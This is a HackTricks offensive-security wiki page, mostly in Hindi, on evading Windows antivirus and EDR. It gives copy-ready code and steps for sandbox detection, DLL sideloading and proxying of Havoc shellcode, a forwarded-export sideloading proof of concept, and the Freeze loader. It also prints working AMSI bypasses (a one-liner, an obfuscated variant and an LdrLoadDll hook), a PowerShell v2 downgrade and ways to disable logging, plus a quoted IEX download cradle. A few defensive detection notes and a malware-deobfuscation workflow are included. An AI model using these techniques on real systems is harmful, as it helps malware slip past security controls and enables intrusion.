# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**This page was written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender को काम करना बंद कराने के लिए एक टूल।
- [no-defender](https://github.com/es3n1n/no-defender): Windows Defender को काम करना बंद कराने के लिए एक टूल जो दूसरे AV को फेक करता है।
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

वर्तमान में, AVs किसी फ़ाइल को malicious बताने के लिए अलग-अलग तरीकों का उपयोग करते हैं: static detection, dynamic analysis, और अधिक advanced EDRs के लिए behavioural analysis।

### **Static detection**

Static detection बाइनरी या स्क्रिप्ट में जाने-पहचाने malicious strings या byte arrays को flag करके हासिल की जाती है, और साथ ही फ़ाइल से खुद जानकारी निकालकर (जैसे file description, company name, digital signatures, icon, checksum, आदि)। इसका मतलब यह है कि public tools का उपयोग करने पर आप आसानी से पकड़े जा सकते हैं, क्योंकि उन्हें शायद पहले ही analyze करके malicious mark किया जा चुका है। इस तरह की detection से बचने के कुछ तरीके हैं:

- **Encryption**

अगर आप बाइनरी को encrypt करते हैं, तो AV के लिए आपके प्रोग्राम का पता लगाना मुश्किल हो जाएगा, लेकिन आपको प्रोग्राम को memory में decrypt और run करने के लिए किसी loader की आवश्यकता होगी।

- **Obfuscation**

कभी-कभी बस अपनी बाइनरी या स्क्रिप्ट में कुछ strings बदल देने से AV को पार किया जा सकता है, लेकिन यह उस चीज़ पर निर्भर करते हुए समय-खपत काम हो सकता है जिसे आप obfuscate कर रहे हैं।

- **Custom tooling**

अगर आप अपने खुद के tools विकसित करते हैं, तो कोई known bad signatures नहीं होंगे, लेकिन यह बहुत समय और मेहनत लेता है।

> [!TIP]
> Windows Defender की static detection के खिलाफ जांच करने का एक अच्छा तरीका है [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)। यह मूल रूप से फ़ाइल को कई segments में बाँटता है और फिर Defender को प्रत्येक segment अलग से scan करने के लिए कहता है, इस तरह यह आपको बिल्कुल बता सकता है कि आपकी बाइनरी में कौन से strings या bytes flagged हैं।

मैं आपको इस practical AV Evasion के बारे में इस [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) को जरूर देखने की सलाह देता हूँ।

### **Dynamic analysis**

Dynamic analysis तब होती है जब AV आपकी बाइनरी को एक sandbox में रन कर के malicious activity देखते हैं (जैसे browser के passwords decrypt कर पढ़ना, LSASS पर minidump करना, आदि)। यह हिस्सा थोड़ा tricky हो सकता है, लेकिन यहाँ कुछ चीजें हैं जो आप sandboxes से बचने के लिए कर सकते हैं।

- **Sleep before execution** लागू तरीके पर निर्भर करते हुए, यह AV के dynamic analysis को bypass करने का एक अच्छा तरीका हो सकता है। AVs के पास फ़ाइलों को scan करने का बहुत कम समय होता है ताकि user के workflow में हस्तक्षेप न हो, इसलिए लंबे sleeps का उपयोग binaries के analysis को विफल कर सकता है। समस्या यह है कि कई AVs के sandboxes sleep को implementation के आधार पर skip कर सकते हैं।
- **Checking machine's resources** आमतौर पर Sandboxes के पास काम करने के लिए बहुत कम resources होते हैं (उदा. < 2GB RAM), अन्यथा वे user की मशीन को धीमा कर सकते हैं। आप यहाँ बहुत creative भी हो सकते हैं, उदाहरण के लिए CPU का temperature या fan speeds चेक करके — हर चीज़ sandbox में implement नहीं होगी।
- **Machine-specific checks** अगर आप किसी ऐसे user को target करना चाहते हैं जिसका workstation "contoso.local" domain से जुड़ा है, तो आप कंप्यूटर के domain की जांच कर सकते हैं कि क्या यह आपके specified domain से मेल खाता है; अगर नहीं, तो आपका प्रोग्राम exit कर सकता है।

मालूम हुआ कि Microsoft Defender के Sandbox computername HAL9TH है, इसलिए आप detonation से पहले अपने malware में computer name की जांच कर सकते हैं; अगर name HAL9TH से match करता है तो इसका मतलब आप defender के sandbox के अंदर हैं, और आप अपना प्रोग्राम exit करवा सकते हैं।

<figure><img src="../images/image (209).png" alt=""><figcaption><p>स्रोत: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes के खिलाफ जाने के लिए [@mgeeky](https://twitter.com/mariuszbit) द्वारा दिए गए कुछ और बहुत अच्छे सुझाव

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev चैनल</p></figcaption></figure>

जैसा कि हमने इस पोस्ट में पहले कहा है, **public tools** अंततः **get detected** हो ही जाते हैं, इसलिए आपको अपने आप से एक बात पूछनी चाहिए:

उदाहरण के लिए, अगर आप LSASS dump करना चाहते हैं, तो क्या आपको सच में mimikatz का उपयोग करना ज़रूरी है? या क्या आप कोई ऐसा अलग प्रोजेक्ट इस्तेमाल कर सकते हैं जो कम जाना-पहचाना हो और जो LSASS भी dump कर दे।

सही जवाब संभवतः दूसरा होगा। mimikatz को उदाहरण के रूप में लें, यह शायद AVs और EDRs द्वारा flagged होने वाला सबसे अधिक जान-पहचाना टूल है; जबकि प्रोजेक्ट खुद बहुत अच्छा है, AVs के आस-पास से बचने के लिए इसके साथ काम करना एक nightmare हो सकता है, इसलिए बस इसके लिए alternatives ढूँढें जो आपके उद्देश्य को पूरा कर सकें।

> [!TIP]
> जब आप अपने payloads को evasion के लिए modify कर रहे हों, तो सुनिश्चित करें कि Defender में automatic sample submission को बंद कर दिया गया है, और कृपया, गंभीरता से, लंबी अवधि में evasion हासिल करने के लिए **VIRUSTOTAL पर UPLOAD न करें**। अगर आप देखना चाहते हैं कि आपका payload किसी विशेष AV द्वारा detect होता है या नहीं, तो उसे एक VM पर install करें, automatic sample submission बंद करने की कोशिश करें, और वहाँ परीक्षण करें जब तक आप परिणाम से संतुष्ट न हों।

## EXEs vs DLLs

जब भी संभव हो, हमेशा evasion के लिए **DLLs का उपयोग प्राथमिकता दें**, मेरे अनुभव में DLL फ़ाइलें आम तौर पर **काफी कम detect** और analyze की जाती हैं, इसलिए यह कुछ मामलों में detection से बचने का एक बहुत सरल तरीका है (बशर्ते आपका payload किसी तरीके से DLL के रूप में रन हो सके)।

जैसा कि हम इस इमेज में देख सकते हैं, Havoc का एक DLL Payload antiscan.me पर 4/26 detection rate दिखाता है, जबकि EXE payload का detection rate 7/26 है।

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

अब हम कुछ tricks दिखाएँगे जो आप DLL फ़ाइलों के साथ उपयोग कर सकते हैं ताकि आप और भी stealthier बन सकें।

## DLL Sideloading & Proxying

**DLL Sideloading** loader द्वारा प्रयोग किए जाने वाले DLL search order का फायदा उठाती है, इसमें victim application और malicious payload(s) को एक-दूसरे के पास रख दिया जाता है।

आप [Siofra](https://github.com/Cybereason/siofra) और निम्नलिखित powershell स्क्रिप्ट का उपयोग करके DLL Sideloading के प्रति susceptible प्रोग्राम्स चेक कर सकते हैं:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
यह कमांड "C:\Program Files\\" के अंदर DLL hijacking के लिए संवेदनशील programs और वे DLL फाइलें जिन्हें वे लोड करने की कोशिश करते हैं, आउटपुट करेगा।

मैं दृढ़ता से सलाह देता हूँ कि आप खुद **DLL Hijackable/Sideloadable programs** का अन्वेषण करें; यह तकनीक सही तरीके से की जाए तो काफी stealthy होती है, लेकिन अगर आप publicly known DLL Sideloadable programs का उपयोग करते हैं तो पकड़े जाने की संभावना बढ़ जाती है।

केवल किसी प्रोग्राम के अपेक्षित नाम वाली malicious DLL रख देने भर से आपका payload नहीं चलेगा, क्योंकि प्रोग्राम उस DLL के अंदर कुछ specific functions की उम्मीद करता है। इस समस्या को ठीक करने के लिए, हम एक और तकनीक का उपयोग करेंगे जिसे **DLL Proxying/Forwarding** कहा जाता है।

**DLL Proxying** proxy (और malicious) DLL से original DLL तक प्रोग्राम द्वारा किए गए calls को आगे भेजता है, इस तरह प्रोग्राम की functionality बनी रहती है और यह आपके payload के execution को संभाल सकता है।

मैं [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) प्रोजेक्ट का उपयोग करूँगा जो [@flangvik](https://twitter.com/Flangvik/) का है।

ये वे steps हैं जिन्हें मैंने अपनाया:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
आखिरी कमांड हमें 2 फ़ाइलें देगी: एक DLL source code template, और मूल नाम बदली हुई DLL।

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

हमारे दोनों shellcode (जो [SGN](https://github.com/EgeBalci/sgn) से एन्कोड किए गए हैं) और proxy DLL का [antiscan.me](https://antiscan.me) पर Detection rate 0/26 है! मैं इसे सफलता कहूँगा।

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> मैं अत्यधिक अनुशंसा करता हूँ कि आप DLL Sideloading के बारे में [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) देखें और साथ ही अधिक गहराई से समझने के लिए [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) भी देखें।

### Forwarded Exports का दुरुपयोग (ForwardSideLoading)

Windows PE modules उन functions को export कर सकते हैं जो असल में "forwarders" होते हैं: code की ओर इशारा करने के बजाय, export entry में `TargetDll.TargetFunc` के रूप में एक ASCII string होती है। जब कोई caller export को resolve करता है, Windows loader:

- यदि पहले से लोड नहीं है तो `TargetDll` को लोड करता है
- उससे `TargetFunc` को resolve करता है

समझने के लिए प्रमुख व्यवहार:
- यदि `TargetDll` एक KnownDLL है, तो यह सुरक्षित KnownDLLs namespace से प्रदान किया जाता है (उदाहरण: ntdll, kernelbase, ole32)।
- यदि `TargetDll` एक KnownDLL नहीं है, तो सामान्य DLL खोज क्रम उपयोग किया जाता है, जिसमें वह मॉड्यूल की डायरेक्टरी शामिल है जो forward resolution कर रहा है।

यह एक indirect sideloading primitive सक्षम करता है: एक signed DLL ढूँढें जो किसी non-KnownDLL module name की ओर forwarded function export करता हो, फिर उस signed DLL को उसी डायरेक्टरी में रखें जहाँ attacker-controlled DLL हो जिसका नाम forwarded target module के बिल्कुल समान हो। जब forwarded export को invoke किया जाता है, loader forward को resolve करता है और उसी डायरेक्टरी से आपकी DLL को लोड करता है, जिससे आपका DllMain execute होता है।

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` एक KnownDLL नहीं है, इसलिए इसे सामान्य खोज क्रम (normal search order) के माध्यम से रिज़ॉल्व किया जाता है।

PoC (copy-paste):
1) साइन किए गए system DLL को किसी writable फ़ोल्डर में कॉपी करें।
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) उसी फ़ोल्डर में एक दुर्भावनापूर्ण `NCRYPTPROV.dll` डालें। एक न्यूनतम `DllMain` कोड निष्पादन के लिए पर्याप्त है; DllMain को ट्रिगर करने के लिए आपको फ़ॉरवर्ड किए गए फ़ंक्शन को लागू करने की आवश्यकता नहीं है।
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) साइन किए गए LOLBin के साथ फॉरवर्ड को ट्रिगर करें:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
प्रेक्षित व्यवहार:
- rundll32 (signed) साइड-बाय-साइड `keyiso.dll` (signed) को लोड करता है
- `KeyIsoSetAuditingInterface` को रिज़ॉल्व करते समय, लोडर फ़ॉरवर्ड को `NCRYPTPROV.SetAuditingInterface` की ओर फॉलो करता है
- लोडर फिर `C:\test` से `NCRYPTPROV.dll` को लोड करता है और उसके `DllMain` को निष्पादित करता है
- यदि `SetAuditingInterface` लागू नहीं है, तो आपको "missing API" त्रुटि केवल तभी मिलेगी जब `DllMain` पहले ही चल चुका होगा

Hunting tips:
- forwarded exports पर ध्यान दें जहाँ target module KnownDLL नहीं है। KnownDLLs सूचीबद्ध हैं `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` के अंतर्गत।
- आप forwarded exports को निम्न tooling के साथ enumerate कर सकते हैं:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Windows 11 forwarder inventory में उम्मीदवार खोजने के लिए देखें: https://hexacorn.com/d/apis_fwd.txt

डिटेक्शन/रक्षा विचार:
- LOLBins (उदा., rundll32.exe) की निगरानी करें जो non-system paths से signed DLLs लोड करते हैं, और फिर उसी बेस नाम के non-KnownDLLs को उसी डायरेक्टरी से लोड करते हैं
- प्रोसेस/मॉड्यूल चेन जैसे: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` जो user-writable paths में हों, उन पर अलर्ट करें
- code integrity नीतियों (WDAC/AppLocker) को लागू करें और application directories में write+execute को अस्वीकार करें

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze एक payload toolkit है जो suspended processes, direct syscalls, और alternative execution methods का उपयोग करके EDRs को bypass करने के लिए है`

आप Freeze का उपयोग अपनी shellcode को गुप्त तरीके से लोड और execute करने के लिए कर सकते हैं।
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion सिर्फ एक cat & mouse game है — जो आज काम करता है वह कल detect हो सकता है, इसलिए कभी केवल एक ही tool पर निर्भर न रहें; यदि संभव हो तो multiple evasion techniques को chain करके इस्तेमाल करें।

## AMSI (Anti-Malware Scan Interface)

AMSI को "fileless malware" को रोकने के लिए बनाया गया था। शुरुआत में, AVs केवल डिस्क पर मौजूद **files on disk** को ही scan कर पाते थे, इसलिए अगर आप किसी तरह payloads को **directly in-memory** execute कर लेते थे तो AV कुछ नहीं कर पाता क्योंकि उसे पर्याप्त visibility नहीं मिलती थी।

AMSI फीचर Windows के इन components में integrated है:

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

यह antivirus समाधानों को script behavior को inspect करने की अनुमति देता है क्योंकि यह script contents को एक ऐसा रूप expose करता है जो unencrypted और unobfuscated होता है।

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यह `amsi:` prepend करता है और उसके बाद उस executable का path दिखाता है जिससे script रन हुआ था — इस केस में powershell.exe

हमने कोई file disk पर drop नहीं किया था, फिर भी AMSI के कारण in-memory में पकड़े गए।

इसके अलावा, **.NET 4.8** से शुरू होकर, C# code भी AMSI के माध्यम से run होता है। इसका असर `Assembly.Load(byte[])` जैसी in-memory execution मेथड़ों पर भी पड़ता है। इसलिए, यदि आप AMSI से बचना चाहते हैं तो in-memory execution के लिए lower versions of .NET (जैसे 4.7.2 या उससे नीचे) का उपयोग करने की सलाह दी जाती है।

AMSI को बाईपास करने के कुछ तरीके हैं:

- **Obfuscation**

  चूंकि AMSI मुख्य रूप से static detections के साथ काम करता है, इसलिए जिन scripts को आप load करने की कोशिश कर रहे हैं उन्हें modify करना detection से बचने का एक अच्छा तरीका हो सकता है।

  हालांकि, AMSI में scripts को unobfuscate करने की capability भी है, भले ही उसमें कई परतें हों, इसलिए obfuscation कैसे किया गया है उस पर निर्भर करते हुए यह एक कमजोर विकल्प भी हो सकता है। इसका मतलब है कि इसे बाईपास करना हमेशा straightforward नहीं होता। फिर भी कभी-कभी बस कुछ variable names बदल देने से काम चल जाता है, इसलिए यह इस बात पर निर्भर करता है कि किसी चीज़ पर कितना flag लगा है।

- **AMSI Bypass**

  चूंकि AMSI को powershell (और cscript.exe, wscript.exe, आदि) process में एक DLL लोड करके implement किया जाता है, इसलिए unprivileged user के रूप में भी इसे आसानी से टैम्पर किया जा सकता है। AMSI के इस implementation flaw के कारण researchers ने AMSI scanning को evade करने के कई तरीके खोजे हैं।

**Forcing an Error**

AMSI initialization को fail (amsiInitFailed) करने पर current process के लिए कोई scan initiate नहीं होगा। मूल रूप से इसे [Matt Graeber](https://twitter.com/mattifestation) ने disclose किया था और Microsoft ने इसके व्यापक उपयोग को रोकने के लिए एक signature विकसित किया है।
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
सिर्फ एक ही powershell कोड लाइन ने वर्तमान powershell प्रक्रिया के लिए AMSI को अनुपयोगी बना दिया। यह लाइन, बेशक, AMSI द्वारा स्वयं फ्लैग की जा चुकी है, इसलिए इस तकनीक का उपयोग करने के लिए कुछ संशोधन आवश्यक हैं।

यहाँ एक संशोधित AMSI bypass है जिसे मैंने इस [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) से लिया है।
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> कृपया [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) को अधिक विस्तृत व्याख्या के लिए पढ़ें।

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
नोट्स
- PowerShell, WScript/CScript और custom loaders सहित सभी जगह काम करता है (जो भी सामान्यतः AMSI को लोड करेगा)।
- stdin के माध्यम से scripts फीड करने के साथ उपयोग करें (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ताकि लंबे command‑line अवशेषों से बचा जा सके।
- LOLBins के माध्यम से चलने वाले loaders द्वारा प्रयोग होते देखा गया है (उदा., `regsvr32` जो `DllRegisterServer` कॉल करता है)।

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**पहचाने गए सिग्नेचर को हटाएँ**

आप वर्तमान प्रक्रिया की मेमोरी से डिटेक्ट की गई AMSI सिग्नेचर हटाने के लिए ऐसे टूल्स का उपयोग कर सकते हैं: **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** और **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**। यह टूल वर्तमान प्रक्रिया की मेमोरी में AMSI सिग्नेचर के लिए स्कैन करके उसे NOP निर्देशों से ओवरराइट करता है, जिससे यह प्रभावी रूप से मेमोरी से हट जाता है।

**AMSI का उपयोग करने वाले AV/EDR उत्पाद**

आप AMSI का उपयोग करने वाले AV/EDR उत्पादों की सूची **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** में पा सकते हैं।

**PowerShell संस्करण 2 का उपयोग करें**
यदि आप PowerShell संस्करण 2 का उपयोग करते हैं, तो AMSI लोड नहीं होगा, इसलिए आप अपने scripts को AMSI द्वारा स्कैन किए बिना चला सकते हैं। आप ऐसा कर सकते हैं:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging एक फीचर है जो सिस्टम पर चलाए गए सभी PowerShell कमांड्स को लॉग करने की अनुमति देता है। यह auditing और troubleshooting के लिए उपयोगी हो सकता है, लेकिन यह उन attackers के लिए भी एक समस्या हो सकता है जो detection से बचना चाहते हैं।

To bypass PowerShell logging, आप निम्न तकनीकों का उपयोग कर सकते हैं:

- **Disable PowerShell Transcription and Module Logging**: आप इस उद्देश्य के लिए एक टूल जैसे [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) का उपयोग कर सकते हैं।
- **Use Powershell version 2**: यदि आप PowerShell version 2 का उपयोग करते हैं, तो AMSI लोड नहीं होगा, इसलिए आप अपने स्क्रिप्ट्स को AMSI द्वारा स्कैन किए बिना चला सकते हैं। आप यह कर सकते हैं: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) का उपयोग करके defenses के बिना एक powershell spawn करें (यही वह है जो `powerpick` from Cobal Strike उपयोग करता है)।

## Obfuscation

> [!TIP]
> कई obfuscation techniques डेटा को encrypt करने पर निर्भर करती हैं, जिससे बाइनरी की entropy बढ़ जाती है और यह AVs और EDRs के लिए इसे detect करना आसान बना देता है। इस बात का ध्यान रखें और शायद encryption केवल कोड के उन specific सेक्शनों पर ही लागू करें जो संवेदनशील हों या जिन्हें छुपाना आवश्यक हो।

### Deobfuscating ConfuserEx-Protected .NET Binaries

जब आप ऐसे मालवेयर का विश्लेषण करते हैं जो ConfuserEx 2 (या commercial forks) का उपयोग करता है, तो अक्सर कई सुरक्षा परतें मिलती हैं जो decompilers और sandboxes को ब्लॉक कर देती हैं। नीचे दिया गया workflow भरोसेमंद तरीके से एक near–original IL को restore करता है जिसे बाद में dnSpy या ILSpy जैसे टूल्स में C# में decompile किया जा सकता है।

1.  Anti-tampering removal – ConfuserEx हर *method body* को encrypt करता है और उसे *module* static constructor (`<Module>.cctor`) के अंदर decrypt करता है। यह PE checksum को भी patch करता है इसलिए किसी भी modification से बाइनरी crash कर सकता है। Encrypted metadata tables को locate करने, XOR keys recover करने और एक clean assembly rewrite करने के लिए **AntiTamperKiller** का उपयोग करें:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output में 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) होंगे जो अपना unpacker बनाते समय उपयोगी हो सकते हैं।

2.  Symbol / control-flow recovery – *clean* फ़ाइल को **de4dot-cex** (de4dot का ConfuserEx-aware fork) को दें।
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profile चुनें  
• de4dot control-flow flattening को undo करेगा, original namespaces, classes और variable names को restore करेगा और constant strings को decrypt करेगा।

3.  Proxy-call stripping – ConfuserEx सीधे method calls को lightweight wrappers (a.k.a *proxy calls*) से replace करता है ताकि decompilation और अधिक कठिन हो। इन्हें हटाने के लिए **ProxyCall-Remover** का उपयोग करें:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
इस चरण के बाद आप opaque wrapper functions की जगह सामान्य .NET API जैसे `Convert.FromBase64String` या `AES.Create()` देखेंगे।

4.  Manual clean-up – resulting binary को dnSpy में चलाएँ, बड़े Base64 blobs या `RijndaelManaged`/`TripleDESCryptoServiceProvider` के उपयोग के लिए search करें ताकि वास्तविक payload locate किया जा सके। अक्सर malware इसे TLV-encoded byte array के रूप में `<Module>.byte_0` के अंदर initialize करता है।

ऊपर दिया गया chain execution flow को **बिना** malicious sample चलाए restore कर देता है — यह offline workstation पर काम करते समय उपयोगी है।

> 🛈  ConfuserEx एक custom attribute `ConfusedByAttribute` बनाता है जिसे samples को स्वचालित रूप से triage करने के लिए IOC के रूप में उपयोग किया जा सकता है।

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): इस प्रोजेक्ट का उद्देश्य [LLVM](http://www.llvm.org/) compilation suite का एक ओपन-सोर्स fork प्रदान करना है जो [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) और tamper-proofing के माध्यम से सॉफ़्टवेयर सुरक्षा बढ़ा सके।
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator यह दर्शाता है कि `C++11/14` भाषा का उपयोग करके compile time पर obfuscated code कैसे जनरेट किया जा सकता है, बिना किसी external tool के और बिना compiler को modify किए।
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework द्वारा जनरेट किए गए obfuscated operations की एक परत जोड़ता है, जो application को क्रैक करने वाले व्यक्ति के लिए काम मुश्किल कर देगा।
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz एक x64 binary obfuscator है जो विभिन्न pe फाइलों जैसे: .exe, .dll, .sys को obfuscate कर सकता है
- [**metame**](https://github.com/a0rtega/metame): Metame arbitrary executables के लिए एक सरल metamorphic code engine है।
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator एक fine-grained code obfuscation framework है जो LLVM-supported languages के लिए ROP (return-oriented programming) का उपयोग करता है। ROPfuscator नियमित निर्देशों को ROP chains में बदलकर assembly code स्तर पर प्रोग्राम को obfuscate करता है, जिससे सामान्य control flow की हमारी धारणा बाधित हो जाती है।
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt Nim में लिखा गया एक .NET PE Crypter है
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor मौजूदा EXE/DLL को shellcode में convert कर सकता है और फिर उन्हें load कर देता है

## SmartScreen & MoTW

आपने यह स्क्रीन इंटरनेट से कुछ executables डाउनलोड करके और उन्हें execute करते समय देखा होगा।

Microsoft Defender SmartScreen एक सुरक्षा तंत्र है जिसका उद्देश्य end user को संभावित रूप से malicious applications चलाने से बचाना है।

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen मुख्यतः एक reputation-based दृष्टिकोण से काम करता है, यानी कम सामान्यतः डाउनलोड की जाने वाली applications SmartScreen को trigger करेंगी और end user को फ़ाइल execute करने से रोकेंगी (हालाँकि फ़ाइल को अभी भी क्लिक करके More Info -> Run anyway के माध्यम से चलाया जा सकता है)।

